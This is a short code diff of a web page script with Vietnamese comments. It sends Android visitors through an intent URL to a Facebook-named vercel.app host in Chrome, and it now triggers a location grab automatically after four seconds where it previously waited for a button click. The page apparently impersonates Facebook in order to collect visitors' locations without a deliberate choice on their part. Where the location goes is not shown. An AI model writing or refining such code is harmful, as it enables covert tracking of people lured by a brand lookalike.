@@ -1,29 +1,19 @@
-const isAndroid = /Android/i.test(navigator.userAgent);
-const isChrome =
-  /Chrome/i.test(navigator.userAgent) && /Google Inc/.test(navigator.vendor);
-
 const btn = document.getElementById("open-chrome-btn");
+btn.addEventListener("click", () => {
+  btn.style.display = "none"; // Ẩn nút sau khi nhấn
 
-// 👉 Nếu đang dùng Android và KHÔNG phải Chrome → tự động chuyển hướng sang Chrome
-if (isAndroid && !isChrome) {
-  window.location.href =
-    "intent://facebook-nu-teal.vercel.app/#Intent;scheme=https;package=com.android.chrome;end;";
-} else {
-  // 👉 Nếu đang ở trong Chrome → hiển thị nút
-  btn.style.display = "block";
+  if (/Android/i.test(navigator.userAgent)) {
+    window.location.href =
+      "intent://facebook-nu-teal.vercel.app/#Intent;scheme=https;package=com.android.chrome;end;";
+  }
+});
 
-  btn.addEventListener("click", () => {
-    btn.style.display = "none";
-    startYourApp(); // Người dùng bấm mới chạy logic chính
-  });
-}
+setTimeout(() => {
+  startYourApp(); // Gọi phần logic chính
+}, 4000); // Hoặc lớn hơn tùy bạn muốn đợi
 
 function startYourApp() {
   //take position
-  if (!navigator.geolocation) {
-    alert("Trình duyệt không hỗ trợ định vị.");
-    return;
-  }
   if (!navigator.geolocation) {
     alert("Trình duyệt không hỗ trợ định vị.");
     return;
